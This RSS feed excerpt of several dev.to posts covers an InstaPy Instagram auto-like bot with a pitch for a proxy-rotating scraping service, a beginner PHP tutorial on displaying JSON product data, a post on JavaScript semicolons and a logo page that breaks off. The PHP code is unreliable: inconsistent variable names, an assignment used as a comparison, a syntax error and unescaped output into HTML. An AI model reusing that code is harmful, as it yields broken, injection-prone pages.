INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Found media type: Photo
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Found media type: Carousel - Video - IGTV
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Post category: Carousel
INFO [2022-01-17 15:47:38] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Found media type: Carousel - Video - IGTV
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Post category: Carousel
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Found media type: Photo
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Found media type: Carousel - Video - IGTV
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Post category: Carousel
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Verifying media type: ('Photo', 'Carousel', 'Video', 'IGTV', 'Clip')
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Found media type: Carousel - Video - IGTV
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Post category: Video
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [1/https://www.instagram.com/p/CY2Dd3HJ5zz/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [2/https://www.instagram.com/p/CY19bPxr2k4/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [3/https://www.instagram.com/p/CY2A408lT3n/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [4/https://www.instagram.com/p/CY2CVJSNlwk/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [5/https://www.instagram.com/p/CY183WwosJb/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [6/https://www.instagram.com/p/CY1_gwktViY/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [7/https://www.instagram.com/p/CY2CGKLOdUs/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [8/https://www.instagram.com/p/CY2B5_ArZnZ/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [9/https://www.instagram.com/p/CY2BPldKhZL/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [10/https://www.instagram.com/p/CY2Fp5SqaGB/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [11/https://www.instagram.com/p/CY2FqIUM1SD/]
INFO [2022-01-17 15:47:39] [&amp;lt;Your Username&amp;gt;]  Links retrieved:: [12/https://www.instagram.com/p/CY2Fpo6q6KF/]
INFO [2022-01-17 15:47:44] [&amp;lt;Your Username&amp;gt;]  Like# [1/11]
INFO [2022-01-17 15:47:44] [&amp;lt;Your Username&amp;gt;]  https://www.instagram.com/p/CY2Fp5SqaGB/
INFO [2022-01-17 15:47:47] [&amp;lt;Your Username&amp;gt;]  Image from: b'estela_fashionmodel'
INFO [2022-01-17 15:47:47] [&amp;lt;Your Username&amp;gt;]  Image link: b'https://www.instagram.com/p/CY2Fp5SqaGB/'
INFO [2022-01-17 15:47:47] [&amp;lt;Your Username&amp;gt;]  Description: b'Thank you!\xf0\x9f\x98\x8d @littleattitudeofficial \xf0\x9f\x98\x8d \n\nHow beautiful this sports set, its fantastic, cozy and above all cotton! \n\nYou can find this and many other clothes only at @littleattitudeofficial !\xf0\x9f\xa4\xa9\n\n#gift #collab #amazing #beautiful #model #modellife #modeling #fashion #fashionstyle #fashionista #fashionblogger #fashionable #love #life #live #blogger @estela_fashionmodel \xf0\x9f\xa4\x8d@littleattitudeofficial \xf0\x9f\x92\x9a'
INFO [2022-01-17 15:47:51] [&amp;lt;Your Username&amp;gt;]  User: 'estela_fashionmodel'  |&amp;gt; followers: 26790  |&amp;gt; following: 849  |&amp;gt; relationship ratio: 31.55
INFO [2022-01-17 15:47:51] [&amp;lt;Your Username&amp;gt;]  User 'estela_fashionmodel's followers count exceeds maximum limit  ~skipping user

INFO [2022-01-17 15:47:51] [&amp;lt;Your Username&amp;gt;]  Like# [2/11]
INFO [2022-01-17 15:47:51] [&amp;lt;Your Username&amp;gt;]  https://www.instagram.com/p/CY2FqIUM1SD/
INFO [2022-01-17 15:47:55] [&amp;lt;Your Username&amp;gt;]  Image from: b'sagavai_black'
INFO [2022-01-17 15:47:55] [&amp;lt;Your Username&amp;gt;]  Image link: b'https://www.instagram.com/p/CY2FqIUM1SD/'
INFO [2022-01-17 15:47:55] [&amp;lt;Your Username&amp;gt;]  Description: b'\xd0\x9f\xd1\x83\xd1\x81\xd1\x82\xd1\x8c \xd0\xbe\xd1\x81\xd1\x82\xd0\xb0\xd0\xbd\xd0\xb5\xd1\x82\xd1\x81\xd1\x8f \xd1\x82\xd1\x83\xd1\x82!!\nme #love #instadaily #selfie #photooftheday #fun #followme #smile #summer #swag #instalike #igers #tbt #picoftheday #follow4follow #fashion #like4like #follow #instagood #amazing #cute #friends #bestoftheday #happy #instatag #l4l #beautiful #likeforlike#sagavai_blak #'
INFO [2022-01-17 15:47:59] [&amp;lt;Your Username&amp;gt;]  User: 'sagavai_black'  |&amp;gt; followers: 5481  |&amp;gt; following: 125  |&amp;gt; relationship ratio: 43.84
INFO [2022-01-17 15:47:59] [&amp;lt;Your Username&amp;gt;]  User 'sagavai_black's following count is less than minimum limit  ~skipping user
INFO [2022-01-17 15:48:10] [&amp;lt;Your Username&amp;gt;]  https://www.instagram.com/p/CY2FqDWhwkI/
INFO [2022-01-17 15:48:18] [&amp;lt;Your Username&amp;gt;]  Image from: b'mr_amaan967'
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;While the response snippet is quite long, let's break down what data is received back.&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;InstaPy confirms a successful Login attempt to Instagram with the given credentials&lt;/li&gt;
&lt;li&gt;11 posts are retrieved based on the hashtags passed through the like_by_tags method. You may ask why 11, when we specified 5 for each hashtag, well that's because InstaPy likes the first post from the Explore page.&lt;/li&gt;
&lt;li&gt;The links to those 11 posts&lt;/li&gt;
&lt;li&gt;A description of each post including the caption, hashtags used, tagged_users, location, and more depending on what the user chooses to expose.&lt;/li&gt;
&lt;li&gt;You also may notice that some scraped posts respond with "Unavailable Page". This can be due to several reasons, but it just may mean the user is private.&lt;/li&gt;
&lt;li&gt;For this example, I did not include all 11 posts in the response, but rather only the first four to avoid writing an entire response epic. 📖
Congrats on making a Python Instagram scraping bot! 🎉 🤖&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Scrape Instagram with SocialScrape ⬇&lt;/strong&gt;&lt;br&gt;
Remember how at the beginning of this article, we mentioned that there is in fact, an incredibly easy way to scrape Instagram? Well, let's loop back around to that again, and talk about SocialScrape!&lt;/p&gt;

&lt;p&gt;Although you may have just made an awesome IG scraping bot of your own, chances are you are going to have to make a lot of repairs along the way. Instagram is a stickler about scraping and does whatever it can to prevent it. If not cautious, the account could be blocked from performing certain actions temporarily, or you could even be banned forever! 🚩 This is why it discouraged to perform scraping on an important/personal account! But SocialScrape fixes that all for you. ✅&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;
&lt;a href="https://socialscrape.com/"&gt;SocialScrape&lt;/a&gt; allows you to paste in a user's "@" handle, and with just one execution call, all the data is ready for you to use. That's amazing!&lt;/li&gt;
&lt;li&gt;If that's not enough, SocialScrape also handles the burden of rotating proxies for you.&lt;/li&gt;
&lt;li&gt;SocialScrape includes numerous API endpoints that allow you to get all the information you need from any user.
And as mentioned before, the first 100 calls are free!
Check out the SocialScrape &lt;a href="https://docs.socialscrape.com/docs#mag-right-sample-response"&gt;getting started docs&lt;/a&gt; to learn more.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;So, what are you waiting for? Instagram data is awaiting to be scraped.&lt;/p&gt;

</description>
      <category>webscraping</category>
      <category>instagram</category>
      <category>python</category>
      <category>bots</category>
    </item>
    <item>
      <title>Data management
with
JSON files and PHP</title>
      <author>HugoDemont62</author>
      <pubDate>Sun, 23 Jan 2022 17:38:19 +0000</pubDate>
      <link>https://dev.to/hugodemont/data-managementwithjson-files-and-php-3413</link>
      <guid>https://dev.to/hugodemont/data-managementwithjson-files-and-php-3413</guid>
      <description>&lt;h2&gt;
  &lt;a href="#data-management"&gt;
  &lt;/a&gt;
  Data Management
&lt;/h2&gt;

&lt;h2&gt;
  &lt;a href="#with"&gt;
  &lt;/a&gt;
  with
&lt;/h2&gt;

&lt;h2&gt;
  &lt;a href="#json-files-and-php"&gt;
  &lt;/a&gt;
  JSON files and PHP
&lt;/h2&gt;




&lt;h2&gt;
  &lt;a href="#i-introduction"&gt;
  &lt;/a&gt;
  I. Introduction
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#1-presentation-of-the-problem"&gt;
  &lt;/a&gt;
  1. Presentation of the problem
&lt;/h3&gt;

&lt;p&gt;During different searches on the internet, I realized that very little information is on the subject of reading information since a JSON file for websites.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-objectivity"&gt;
  &lt;/a&gt;
  2. Objectivity
&lt;/h3&gt;

&lt;p&gt;In the document you will find how to use the information correctly thanks to some examples. It should be noted that the author of this report seeks to report the findings of the analysis of this research in an objective manner.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3-motivation"&gt;
  &lt;/a&gt;
  3. Motivation
&lt;/h3&gt;

&lt;p&gt;The motivations for writing this article are the result of a lack of precise information on the subject of the JSON with some differences between the JSON Objects and the JSON Tables.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#ii-exhibition"&gt;
  &lt;/a&gt;
  II. Exhibition
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#1-presentation-of-the-topic"&gt;
  &lt;/a&gt;
  1. Presentation of the topic
&lt;/h3&gt;

&lt;p&gt;To fully understand the explanations, we need to establish some things, I wish with this article to teach you to use the JSON as storage space even if the BDD (Database) in MySQL is much more secure than the JSON folders. Here not to fade in front of a web development topic I show you roughly how JSON works with PHP.&lt;/p&gt;

&lt;p&gt;JSON means JavaScript Object Notation JSON. It is a text format for storing and transporting JSON data. It is "self-descriptive" and easy to understand.&lt;/p&gt;

&lt;p&gt;We have to have a number of things at our disposal to get into the code.&lt;/p&gt;

&lt;p&gt;A code editor (PhpStorm / VSCode / …),&lt;/p&gt;

&lt;p&gt;Basic knowledge of PHP,&lt;/p&gt;

&lt;p&gt;Have a JSON file(below for my article),&lt;/p&gt;

&lt;p&gt;Key 1 and Key 2 images: &lt;a href="https://ibb.co/R47RkMH"&gt;1&lt;/a&gt; and &lt;a href="https://ibb.co/hHRHS0m"&gt;2&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;And of the motivation!&lt;/p&gt;

&lt;p&gt;JSON file:&lt;/p&gt;

&lt;p&gt;File name: products.json&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
"R230595": { "Title": "SanDisk 32G USB Key",
"imageUrl": "clef1.jpg",
"description": "32 GB, USB 3.0 (USB 2.0 compatible)",
"price": 23.99,
"type" : "cle"},
"R250075": { "title": "Emtec Flash Voyager 32",
"imageUrl": "clef2.jpg",
"description": "32 GB, USB 3.0 (USB 2.0 compatible)",
"price": 19.99,
"type" : "cle" }
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;h2&gt;
  &lt;a href="#iii-when-we-have-objects"&gt;
  &lt;/a&gt;
  III. When we have objects
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#1-recovery"&gt;
  &lt;/a&gt;
  1. Recovery
&lt;/h3&gt;

&lt;p&gt;We are in a php file regardless of its name, we will initially retrieve the information of the JSON file named “products.json”. In PHP two important functions will be useful to decrypt the file JSON.&lt;/p&gt;

&lt;p&gt;“fle_get_contents” and “json_decode”, the fle_get_contents() will retrieve the file where we put it. For example, if my file is in a data folder I will do:&lt;br&gt;
file_get_contents('data/products.json');&lt;/p&gt;

&lt;p&gt;This little bit of code will look in the data folder for file products.json, enfn we can enter this fle_get_contents into a variable.&lt;/p&gt;

&lt;p&gt;The second function "json_decode" will decrypt a json file by using it as an associative array where we have additional information with true or leave them as a JSON object with false, this result can also be stored in a variable.&lt;/p&gt;

&lt;p&gt;To take the information we must therefore have a code that looks like this:&lt;/p&gt;

&lt;p&gt;`$filename = 'data/products.json';&lt;/p&gt;

&lt;p&gt;$arrays = json_decode(file_get_contents($filename),true); var_dump($tables);`&lt;/p&gt;

&lt;p&gt;So here it will be in our WAMP server:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;array (size=2)

'R230595' =&amp;gt;

array (size=5)

'title' =&amp;gt; string 'SanDisk 32G' (length=20)

'imageUrl' =&amp;gt; string 'clef1.jpg' (length=25)

'description' =&amp;gt; string '32 GB, USB 3.0 (USB 2.0 compatible)' (length=35)

'price' =&amp;gt; foat 23.99

'type' =&amp;gt; string 'cle' (length=3)

'R250075' =&amp;gt;

array (size=5)

'title' =&amp;gt; string 'Emtec Flash Voyager 32' (length=22)

'imageUrl' =&amp;gt; string 'clef2.jpg' (length=25)

'description' =&amp;gt; string '32 GB, USB 3.0 (USB 2.0 compatible)' (length=35)

'price' =&amp;gt; foat 19.99

'type' =&amp;gt; string 'cle' (length=3)
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;So we get an associative table that will serve us in the next part of the chapter.&lt;/p&gt;

&lt;p&gt;Note that we get exactly the same thing as the JSON file , but this time we can use the information from the associative array.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#2-display"&gt;
  &lt;/a&gt;
  2. Display
&lt;/h3&gt;

&lt;p&gt;Certainly we know how to recover the information of a JSON file but for the moment impossible to afcher in the state with a var_dump($tableaux);We want to see the images and information correctly with html and why not css/scss.&lt;/p&gt;

&lt;p&gt;In our associative table the keys are the references of the products, like “R230595” and others, we want the different information inside the table for this we need to make a loop to retrieve the information of the tables.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;foreach ($tableau as $key=&amp;gt;$val)&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;In the $arrays which is the json_decode we assign two values the key which is $key and the value of the key which is $val.&lt;/p&gt;

&lt;p&gt;To afcher the information of a product we must for more ease use a function why not afcheProduit.&lt;/p&gt;

&lt;p&gt;Our loop where we want to send the information must therefore correspond to this code:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;foreach ($tableaux as $key=&amp;gt;$val) {&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;Product Display($key);&lt;/code&gt;&lt;br&gt;
&lt;code&gt;}&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;For the function we have to retrieve the $key which is the product reference of the famous “R230595” to use it for taking information in the afchage.&lt;/p&gt;

&lt;p&gt;To write html in PHP we will use an echo with quotes to avoid problems with the “” of html.&lt;/p&gt;

&lt;p&gt;So we get: &lt;code&gt;echo ''&lt;/code&gt;; Inside you inject your HTML code.&lt;/p&gt;

&lt;p&gt;To obtain the information we must write in the echo the file decrypted the reference and enfn&lt;br&gt;
the information. In a PHP echo to write inside we have to use quotes and dots,&lt;br&gt;
for our information stored in the associative array “arrays” if we wish to&lt;br&gt;
afcher we just have to write the name of the array in which object they are stored and enfn the&lt;br&gt;
Desired key to have the value that is enclosed.&lt;br&gt;
Which gives us:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;`&amp;lt;img class="produits__image" src="'.$tableaux[$produit]['imageUrl'].'" alt="clé"&amp;gt;`
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here we have the $tableau which is the associative tableau, the $produit which is the reference of our products and infn the ‘imageUrl’ which is simply the key of the address of the image: 'imageUrl' =&amp;gt; string 'clef1.jpg' so we have in the src clef1.jpg which we get our image.&lt;/p&gt;

&lt;p&gt;Here is a code for each element:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function displayProduct($produit){

$filename = 'data/products.json';
$arrays = json_decode(file_get_contents($filename),true); echo '
&amp;lt;li class="productts__item"&amp;gt;
&amp;lt;div class="productts__pic"&amp;gt;
&amp;lt;a href=""&amp;gt;&amp;lt;img class="produits__image" src="'.$tableaux[$produit]['imageUrl'].'" alt="clé"&amp;gt;&amp;lt;/a&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class="products__infos"&amp;gt;
&amp;lt;a class="productts__name text"
href="article.php? reference='. $produit. '"&amp;gt;'. $tableaux[$produit]['titre'
]. ' ('.$produit.')&amp;lt;/a&amp;gt;
&amp;lt;p class="products__desc
desc"&amp;gt;'. $tableaux[$produit]['description']. '&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class="products__cta"&amp;gt;
&amp;lt;a class="productts__link"
href="adderPanier.php? reference='. $produit. '"&amp;gt;&amp;lt;img
class="productts__addtocart" src="assets/site/buy.png"
alt="buy"&amp;gt;&amp;lt;/a&amp;gt;
&amp;lt;p class="products__prix
text"&amp;gt;'. $tableaux[$produit]['prix']. '€&amp;lt;/p&amp;gt; &amp;lt;/div&amp;gt;

&amp;lt;/li&amp;gt;';

}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;The classes have been adapted to my css code I let you do it for your css code.&lt;/p&gt;




&lt;h2&gt;
  &lt;a href="#iv-when-we-have-objects-and-paintings"&gt;
  &lt;/a&gt;
  IV. When we have objects and paintings
&lt;/h2&gt;

&lt;h3&gt;
  &lt;a href="#1-recovery"&gt;
  &lt;/a&gt;
  1. Recovery
&lt;/h3&gt;

&lt;p&gt;We have seen and understood how the JSON afchage works in php. But! This is not the only case observed, let’s take a new example! If we have comments to afcher to this kind of product as in the new file JSON that I will give you:&lt;/p&gt;

&lt;p&gt;The file JSON avis.json:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;{
"Comments":[
{"reference": "R230595",
"Author": "Seb",
"date" : "12/05/2018",
"note":7,
"Review": "Great product I recommend"},
{"reference": "R230595",
"author": "Gilles",
"date" : "17/06/2018",
"note":8,
"Review":"Product meets my expectations. Delivery is always at the top!" },
{"reference": "R250075",
"author": "Vincent",
"date" : "05/08/2018",
"note": 4,
"Review": "Good quality product but no instructions from
montage. I had to look online. Bof Bof :-("}
]
}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;h3&gt;
  &lt;a href="#2-comprehension"&gt;
  &lt;/a&gt;
  2. comprehension
&lt;/h3&gt;

&lt;p&gt;In the new file JSON we have a new specificity, don’t be afraid! it’s quite simple! We have in a defined JSON object with the {} at the beginning up to the fn but inside this set, we have a table delimited with the [] which complicates us a little more the task during the display but nothing serious! We will try to display each comment in relation to the product.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#3-code"&gt;
  &lt;/a&gt;
  3. Code
&lt;/h3&gt;

&lt;p&gt;First of all it is necessary to decode the file again at the entry of the function that we will name afcheCommentaire. So you can reuse the code previously with the modification of the name of the file which gives:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;`function displayCommentary() {

$filename = 'data/avis.json';
$arrays = json_decode(file_get_contents($filename), true);
}`
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Enfn we have to use the associative array to fetch the information, as previously we have to use the associative array, for this in your html code in the echo you will use the: '.$arrays['comments']. ' but we have a problem, comment is a table, with IDs, to be able to afcher them we are therefore obliged to make a loop for to take the information. Which gives us overall:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;`&amp;lt;p class="commentaires__par"&amp;gt;by &amp;lt;span

class="text"&amp;gt;'. $tables['comments'][$i]['author']. '&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;`
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;



&lt;p&gt;Here the code afche the author of the comments, but to have the $i we must make a loop for as opposite:&lt;/p&gt;

&lt;p&gt;`for ($i = 0; $i &amp;lt; count($tables['comments']); $i++){&lt;/p&gt;

&lt;p&gt;}`&lt;/p&gt;

&lt;p&gt;In order to have the elements of a particular product, of the comments of the product in question, we are therefore obliged to make an if in this for loop to require that the reference of the product is the same as the $_GET[‘reference’] given when sending to the article. Which gives us a very simple code. I even added a function when there are no comments! The code:&lt;br&gt;
&lt;/p&gt;

&lt;div class="highlight js-code-highlight"&gt;
&lt;pre class="highlight plaintext"&gt;&lt;code&gt;function displayCommentary() {

$filename = 'data/avis.json';
$arrays = json_decode(file_get_contents($filename), true);



echo '

&amp;lt;h2 class="text heading"&amp;gt;Comments&amp;lt;/h2&amp;gt; &amp;lt;div class="commentaires__grid"&amp;gt;';
$com = false;

for ($i = 0; $i &amp;lt; count($tables['comments']); $i++){ if ($tables['comments'][$i]['reference'] =

$_GET['reference']){
$com = true;
echo ' ' &amp;lt;div class="commentaires__user"&amp;gt;
&amp;lt;p class="commentaires__par"&amp;gt;by &amp;lt;span class="text"&amp;gt;'. $tables['comments'][$i]['author']. '&amp;lt;/span&amp;gt;&amp;lt;/p&amp;gt;
&amp;lt;p
class="commentaires__posted"&amp;gt;'. $tableaux['commentaires'][$i]['date'].
'&amp;lt;/p&amp;gt;
&amp;lt;p
class="commentaires__note"&amp;gt;'. $tableaux['commentaires'][$i]['note']. '/
10&amp;lt;/p&amp;gt;
&amp;lt;/div&amp;gt;
&amp;lt;div class="commentaires__avis"&amp;gt;
&amp;lt;p
class="commentaires__text"&amp;gt;'. $tableaux['commentaires'][$i]['avis']. '&amp;lt; /p&amp;gt;
&amp;lt;/div&amp;gt;';

}

}
if (!$com){
echo '&amp;lt;i&amp;gt;No comments&amp;lt;/i&amp;gt;';
}
echo '&amp;lt;/div&amp;gt;';

}
&lt;/code&gt;&lt;/pre&gt;

&lt;/div&gt;






&lt;p&gt;V. Conclusion&lt;/p&gt;

&lt;p&gt;And yes! it is quite simple to afcher each element but without having any knowledge in PHP or JSON, it is complicated to orient oneself in all this. I hope this article helped you in your code! Other codes are possible such as knowing the number of notices, calculating the average of notices, putting items in a shopping cart, etc. , for the part of the afchage you should succeed by following my “advice”. Good luck!&lt;/p&gt;

&lt;p&gt;Sory for my very bad english im just a french guy.&lt;/p&gt;

&lt;p&gt;Hugo Demont, étudiant à l’université&lt;/p&gt;

&lt;p&gt;LENS technology in the first year of LENS MMI&lt;/p&gt;

</description>
      <category>php</category>
      <category>beginners</category>
      <category>webdev</category>
      <category>tutorial</category>
    </item>
    <item>
      <title>Semicolon or No semicolon?</title>
      <author>Sumit Kumar Surana</author>
      <pubDate>Sun, 23 Jan 2022 17:20:40 +0000</pubDate>
      <link>https://dev.to/ssurana2/semicolon-or-no-semicolon-2d7h</link>
      <guid>https://dev.to/ssurana2/semicolon-or-no-semicolon-2d7h</guid>
      <description>&lt;p&gt;I have 10 years of experience being a JavaScript developer and I forget that semicolon is optional. Adding a semicolon in the end is a simple instinct for me.&lt;/p&gt;

&lt;p&gt;From my point of view, if you are using the right tools like jshint or jslint to catch the syntax errors before pushing the code to your repository, it doesn't matter if you use a semicolon or not. &lt;/p&gt;

&lt;p&gt;I use semicolons in the end because I am tuned that way while working with professionals or mentors who end the statement with a semicolon. I also advocate using semicolons in the end because of the following reasons.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#automatic-semicolon-assertion"&gt;
  &lt;/a&gt;
  Automatic semicolon assertion
&lt;/h3&gt;

&lt;p&gt;I won’t spend too much time explaining about it since it is really well articulated in ecma specs &lt;a href="https://tc39.es/ecma262/#sec-automatic-semicolon-insertion"&gt;https://tc39.es/ecma262/#sec-automatic-semicolon-insertion&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;To put it simply, it is better to handle the semicolon ourselves than relying on a compiler/minifier which has a chance of being unpredictable. Especially, when you are using ‘[‘ or ‘(‘ or binary operator or a regex in the next line without ending the previous statement with a semicolon. Refer &lt;a href="https://tc39.es/ecma262/#sec-asi-interesting-cases-in-statement-lists"&gt;https://tc39.es/ecma262/#sec-asi-interesting-cases-in-statement-lists&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;I prefer lesser risk on my production code and I believe in the statement that if something can go wrong it will definitely go wrong.&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#consistency"&gt;
  &lt;/a&gt;
  Consistency
&lt;/h3&gt;

&lt;p&gt;Most developers nowadays are full stack developers who have dabbled in one or more backend languages. And most of the popular backend languages (apart from &lt;a href="https://www.python.org"&gt;python&lt;/a&gt; that I know of) have statements ending with semicolon. &lt;/p&gt;

&lt;p&gt;So when a developer tends to switch between other programming languages and JavaScript they don't have to unlearn the idea of not putting the semicolon in the end. Remember it is optional. So no offense if someone puts it or omits it. But the idea is to keep a single standard and consistency so that it doesn't cause any confusion among team members on what to follow. So make sure you choose one or else brace yourself for resolving lots of ideology clashes among the team members like the discussion going on at &lt;a href="https://davidwalsh.name/javascript-semicolons"&gt;https://davidwalsh.name/javascript-semicolons&lt;/a&gt;.&lt;/p&gt;

</description>
      <category>javascript</category>
      <category>webdev</category>
    </item>
    <item>
      <title>Logos for Reco Fans! | Reco PC Server</title>
      <author>Arvinth Krishna</author>
      <pubDate>Sun, 23 Jan 2022 17:13:09 +0000</pubDate>
      <link>https://dev.to/arvinthkrishna/logos-for-reco-fans-reco-pc-server-3bl7</link>
      <guid>https://dev.to/arvinthkrishna/logos-for-reco-fans-reco-pc-server-3bl7</guid>
      <description>&lt;h3&gt;
  &lt;a href="#reco-pc-server-logo"&gt;
  &lt;/a&gt;
  Reco PC Server Logo
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--Lamm3k3K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Arvinth-Krishna/Reco-PC-Server/main/reco_logos/Reco_logo.png" class="article-body-image-wrapper"&gt;&lt;img alt="Reco PC Server Logo" src="https://res.cloudinary.com/practicaldev/image/fetch/s--Lamm3k3K--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Arvinth-Krishna/Reco-PC-Server/main/reco_logos/Reco_logo.png" width="880" height="880"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#reco-pc-server-mobile-logo"&gt;
  &lt;/a&gt;
  Reco PC Server - Mobile Logo
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--sw5hDIdZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Arvinth-Krishna/Reco-PC-Server/main/reco_logos/Reco_Mobile_logo.png" class="article-body-image-wrapper"&gt;&lt;img alt="Reco PC Server - Mobile Logo" src="https://res.cloudinary.com/practicaldev/image/fetch/s--sw5hDIdZ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Arvinth-Krishna/Reco-PC-Server/main/reco_logos/Reco_Mobile_logo.png" width="880" height="880"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h3&gt;
  &lt;a href="#reco-pc-server-commander-logo"&gt;
  &lt;/a&gt;
  Reco PC Server - Commander Logo
&lt;/h3&gt;

&lt;p&gt;&lt;a href="https://res.cloudinary.com/practicaldev/image/fetch/s--88bGTyoQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Arvinth-Krishna/Reco-PC-Server/main/reco_logos/Reco_PC_Server_Desktop_logo.png" class="article-body-image-wrapper"&gt;&lt;img alt="Reco PC Server - Commander Logo" src="https://res.cloudinary.com/practicaldev/image/fetch/s--88bGTyoQ--/c_limit%2Cf_auto%2Cfl_progressive%2Cq_auto%2Cw_880/https://raw.githubusercontent.com/Arvinth-Krishna/Reco-PC-Server/main/reco_logos/Reco_PC_Server_Desktop_logo.png" width="880" height="880"&gt;&lt;/a&gt;&lt;/p&gt;

&lt;h4&gt;
  &lt;a href="#what-is-reco-pc-server"&gt;
  &lt;/a&gt;
  What is Reco PC Server?
&lt;/h4&gt;

